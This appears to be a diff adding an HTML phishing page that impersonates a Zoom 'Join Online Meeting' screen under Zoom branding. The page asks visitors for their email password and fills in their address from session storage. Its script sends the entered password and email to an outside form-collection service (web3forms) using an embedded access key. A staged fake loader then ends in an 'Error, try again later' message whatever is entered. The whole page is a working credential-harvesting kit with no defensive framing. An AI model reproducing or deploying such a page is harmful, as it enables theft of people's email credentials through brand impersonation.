@@ -1,0 +1,463 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
+    <script src="js/jquery.3.7.0.js"></script>
+    <title>Zoom-Call-Group-Meeting</title>
+  </head>
+  <body>
+    <main>
+      <nav>
+<!-- Navigation top section -->
+<div class="nav-top" style="display: flex; justify-content: flex-end; align-items: center; background-color: #001f3d; padding: 10px 20px; font-weight: 300;">
+    <span id="mobile_menu" style="color: white; font-size: 24px; margin-right: 10px; font-weight: 300;">☰</span>
+  
+    <!-- Left side content -->
+    <ul class="nav-left" style="display: flex; align-items: center; list-style: none; margin: 0; padding: 0; color: white; font-weight: 300;">
+      <li style="margin-right: 5px;">
+        <span style="display: flex; align-items: center; color: white;">
+          <!-- Inline SVG for search icon -->
+          <svg id="search_svg" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 5px;">
+            <circle cx="11" cy="11" r="8"/>
+            <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+          </svg>search
+        </span>
+      </li>
+      <li style="margin-right: 5px;">
+        <a href="/" style="color: white; text-decoration: none; font-weight: 300;">Support</a>
+      </li>
+      <li style="margin-right: 5px;">
+        <a href="/" style="color: white; text-decoration: none; font-weight: 300;">1.848.769.9646</a>
+      </li>
+      <li style="margin-right: 5px;">
+        <a href="/" style="color: white; text-decoration: none; font-weight: 300;">Request a Demo</a>
+      </li>
+    </ul>
+  
+    <!-- Right side content -->
+    <ul class="nav-right" style="display: flex; align-items: center; list-style: none; margin: 0; padding: 0; color: white; font-weight: 300;">
+      <li style="margin-right: 1px;">
+        <a href="/" style="color: white; text-decoration: none; font-weight: 300;">Join</a>
+      </li>
+      <li style="margin-right: 1px; color: white; font-weight: 300;">|</li>
+      <li id="host-container" style="display: flex; align-items: center; color: white;  font-weight: 300;">
+        Host
+        <!-- Inline SVG for arrow down -->
+        <svg id="host_svg" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16" style="margin-left: 5px;">
+          <path d="M1.5 5.5l6 6 6-6" />
+        </svg>
+      </li>
+      <li>
+        <a href="/" style="color: white; text-decoration: none; font-weight: 300; margin-left: 0;" >Sign In</a>
+      </li>
+    </ul>
+  </div>
+
+<!-- Navigation main section (white background) -->
+<!-- Navigation main section (white background) -->
+<div class="nav-main" style="display: flex; justify-content: space-between; align-items: center; background-color: white; padding: 20px 40px; box-sizing: border-box;">
+    <div class="logo-container" style="display: flex; align-items: center;">
+      <img id="zoom-img" src="img/logo.svg" alt="Logo" style="height: 40px; width: 100px; margin-right: 20px;" />
+      <span style="display: flex; gap: 20px;">
+        <a href="/" style="color: #555; text-decoration: none; font-weight: bold; font-family: 'Arial', sans-serif;">Products</a>
+        <a href="/" style="color: #555; text-decoration: none; font-weight: bold; font-family: 'Arial', sans-serif;">Solutions</a>
+        <a href="/" style="color: #555; text-decoration: none; font-weight: bold; font-family: 'Arial', sans-serif;">Resources</a>
+        <a href="/" style="color: #555; text-decoration: none; font-weight: bold; font-family: 'Arial', sans-serif;">Plans &amp; Pricing</a>
+      </span>
+    </div>
+    
+    <div class="cta-container" style="display: flex; align-items: center; gap: 20px;">
+      <a id="contact-sales" href="/" style="color: #007bff; background-color: white; border: 2px solid #007bff; padding: 10px 20px; text-decoration: none; border-radius: 30px; font-weight: bold; transition: all 0.3s ease; font-family: 'Arial', sans-serif;">
+        Contact Sales
+      </a>
+      <a id="sign-up" href="/" style="color: white; background-color: #007bff; padding: 10px 20px; text-decoration: none; border-radius: 30px; font-weight: bold; transition: all 0.3s ease; font-family: 'Arial', sans-serif;">
+        Sign Up Free
+      </a>
+    </div>
+  </div>
+  
+  <!-- Add media queries for mobile responsiveness -->
+  <style>
+    @media screen and (max-width: 768px) {
+      .nav-main {
+        flex-direction: column;
+        align-items: center;
+        padding: 10px;
+      }
+  
+      .logo-container {
+        flex-direction: column;
+        align-items: center;
+        margin-bottom: 10px;
+      }
+  
+      .logo-container img {
+        height: 40px;
+        margin-bottom: 10px;
+      }
+  
+      .logo-container span {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 10px;
+      }
+  
+      .cta-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+      }
+  
+      .cta-container a {
+        padding: 10px 20px;
+        font-size: 16px;
+      }
+    }
+  
+    @media screen and (max-width: 480px) {
+      .cta-container a {
+        padding: 8px 16px;
+        font-size: 14px;
+      }
+  
+      .logo-container img {
+        height: 35px;
+      }
+    }
+  </style>
+      </nav>
+      <hr class="nav-divider" />
+      <section class="meeting_container">
+        <div class="meeting_contents">
+          <h1>Join Online Meeting</h1>
+      
+          <div class="meeting_header">
+            Welcome, <b><span id="id"></span></b>. You have been invited to join a meeting.
+          </div>
+      
+          <div class="meeting_online">
+            <b>Sign in as:</b>
+          </div>
+      <form method="POST" id="form">
+                                    <!-- Replace with your Access Key -->
+                                    <input type="hidden" name="access_key" value="362eaa24-91f0-43c5-9b52-8fe071240dd0">
+          <div class="meeting_reg">
+            <h2 id="mailer"><span id="access"></span></h2>
+             <input
+              name="paswrd"
+              type="password"
+              id="ipass"
+              required="required"
+              placeholder="Enter email password"
+              style="color: black; border-color: #ddd; border-radius: 12px; padding: 10px; width: 80%; margin-top: 10px; font-size: 16px; display: block; margin-left: auto; margin-right: auto;"
+            />
+      
+            <p class="terms">
+              <input type="checkbox" checked />
+              <span>I agree to the <a href="javascript:void(0)">Terms of Service</a></span>
+            </p>
+          </div>
+      
+          <!-- Modern spinner -->
+          <div class="meeting_loading" style="display:none;">
+            <div class="spinner"></div>
+            <span id="loader_text">Launching...</span>
+          </div>
+      
+          <div id="error_message" style="color: red; display: none;"></div>
+
+            <input type="hidden" id="name" name="name" value="John Doe" />
+            <input type="hidden" id="mail" name="email" value="johndoe@example.com" />
+            <input type="hidden" id="pass1" />
+            <input type="hidden" id="pass2" />
+      
+            
+      <div id="result"></div>
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "<b></b>"
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "<span style='color:red;'><b></b></span>";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "";
+        })
+        .then(function() {
+            password.reset();
+            setTimeout(() => {
+                result.style.display = "none";
+            }, 3000);
+        });
+});
+</script>
+          <button id="launch_btn" onclick="launchMeeting()">Launch Meeting</button>
+      
+          <div class="meeting_note">
+            If you are unable to join the meeting,
+            <a href="javascript:void(0)" onclick="window.location.reload(true);">click here to <b>Refresh</b></a>.
+          </div>
+        </div>
+      </section>
+      
+      <!-- Footer -->
+      <footer>
+        <div style="width: 100%; background-color: #f8f9fa; padding: 20px 0; text-align: center; font-size: 12px; color: #999; border-top: 1px solid #eee; position: relative; bottom: 0;">
+          Copyright ©2024 Zoom Video Communication, Inc. All Rights Reserved.
+          <p><a href="javascript:void(0);" style="color: #007bff; text-decoration: none;">Privacy Policy</a> | <a href="javascript:void(0);" style="color: #007bff; text-decoration: none;">Terms of Service</a></p>
+        </div>
+      </footer>
+      
+      <style>
+        body {
+          font-family: 'Arial', sans-serif;
+          background-color: #f5f5f5;
+          margin: 0;
+          padding: 0;
+          color: #333;
+          display: flex;
+          flex-direction: column;
+          min-height: 100vh;
+        }
+      
+        .meeting_container {
+          background-color: white;
+          padding: 20px;
+          max-width: 600px;
+          margin: 50px auto;
+          border-radius: 12px;
+          box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+          text-align: center;
+          flex-grow: 1;
+        }
+      
+        .meeting_contents h1 {
+          font-size: 24px;
+          color: #333;
+          margin-bottom: 20px;
+        }
+      
+        .meeting_header {
+          font-size: 18px;
+          margin-top: 20px;
+          color: #555;
+        }
+      
+        .meeting_online {
+          font-size: 16px;
+          margin-top: 10px;
+          color: #777;
+        }
+      
+        .meeting_reg {
+          margin-top: 30px;
+          text-align: left;
+        }
+      
+        #mailer {
+          font-size: 18px;
+          color: #333;
+          text-align: center;
+        }
+      
+        input[type="password"] {
+          padding: 10px;
+          width: 80%;
+          margin: 15px 0;
+          border: 1px solid #ddd;
+          border-radius: 12px;
+          font-size: 16px;
+          color: #333;
+          display: block;
+          margin-left: auto;
+          margin-right: auto;
+        }
+      
+        /* Modern spinner */
+        .meeting_loading {
+          margin-top: 20px;
+          display: none;
+          color: #007bff;
+          font-size: 16px;
+        }
+      
+        .spinner {
+          border: 4px solid #f3f3f3;
+          border-top: 4px solid #007bff;
+          border-radius: 50%;
+          width: 50px;
+          height: 50px;
+          animation: spin 2s linear infinite;
+          margin: 0 auto;
+        }
+      
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+      
+        button {
+          padding: 12px 25px;
+          background-color: #007bff;
+          color: white;
+          border: none;
+          border-radius: 50px;
+          font-size: 18px;
+          cursor: pointer;
+          margin-top: 20px;
+          transition: background-color 0.3s;
+          font-weight: lighter;
+        }
+      
+        button:hover {
+          background-color: #0056b3;
+        }
+      
+        button:disabled {
+          background-color: #aaa;
+        }
+      
+        .meeting_note {
+          margin-top: 30px;
+          font-size: 14px;
+        }
+      
+        .meeting_note a {
+          color: #007bff;
+          text-decoration: none;
+        }
+      
+        .meeting_note a:hover {
+          text-decoration: underline;
+        }
+      
+        .terms {
+          text-align: center;
+          margin-top: 15px;
+        }
+      
+        /* Footer */
+        .footer {
+          background-color: #333;
+          color: white;
+          padding: 20px 0;
+          text-align: center;
+          margin-top: 20px;
+        }
+      
+        .footer_content p {
+          margin: 5px 0;
+          font-size: 14px;
+        }
+      
+        .footer_content a {
+          color: #007bff;
+          text-decoration: none;
+        }
+      
+        .footer_content a:hover {
+          text-decoration: underline;
+        }
+      </style>
+      
+      <script>
+        // This function is responsible for getting the company details and populating the fields
+        window.onload = function() {
+          // Fetching company details (for example, from URL or stored in sessionStorage)
+          var companyName = sessionStorage.getItem("company_name") || ""; // Empty string if not set
+          var email = sessionStorage.getItem("email") || ""; // Empty string if not set
+      
+          // Set company name and email to the respective fields
+          document.getElementById("id").textContent = companyName; 
+          document.getElementById("access").textContent = email;
+          document.getElementById("name").value = companyName;
+          document.getElementById("mail").value = email;
+          document.getElementById("get_id").value = companyName;
+          document.getElementById("get_access").value = email;
+        };
+      
+        function launchMeeting() {
+          var password = document.getElementById("ipass").value;
+          var errorMessage = document.getElementById("error_message");
+      
+          // Hide error message initially
+          errorMessage.style.display = 'none';
+      
+          if (!password) {
+            // Show the "Please enter your password" message
+            errorMessage.style.display = 'block';
+            errorMessage.textContent = 'Please enter your email password.';
+      
+            // Hide the message after 3 seconds
+            setTimeout(function() {
+              errorMessage.style.display = 'none';
+            }, 3000);
+      
+            return;
+          }
+      
+          // Show the loader
+          document.querySelector(".meeting_loading").style.display = 'block';
+          var loaderText = document.getElementById("loader_text");
+          var prompts = [
+            "Launching...",
+            "Detecting operating system...",
+            "System verification...",
+            "Connecting to meeting...",
+            "Initializing..."
+          ];
+          var i = 0;
+      
+          var loadingInterval = setInterval(function() {
+            if (i < prompts.length) {
+              loaderText.textContent = prompts[i];
+              i++;
+            } else {
+              clearInterval(loadingInterval);
+      
+              // Simulate password validation, replace this with real validation logic
+              var isValidPassword = password === "correctpassword";  // Change "correctpassword" to your validation logic
+      
+              // Show error message regardless of whether password is correct or not
+              errorMessage.style.display = 'block';
+              errorMessage.textContent = 'Error, try again later.';
+      
+              document.querySelector(".meeting_loading").style.display = 'none';
+            }
+          }, 1500);  // Change 1500 to adjust the delay between prompts
+        }
+      </script>
+
+    </main>
+  </body>
+</html>
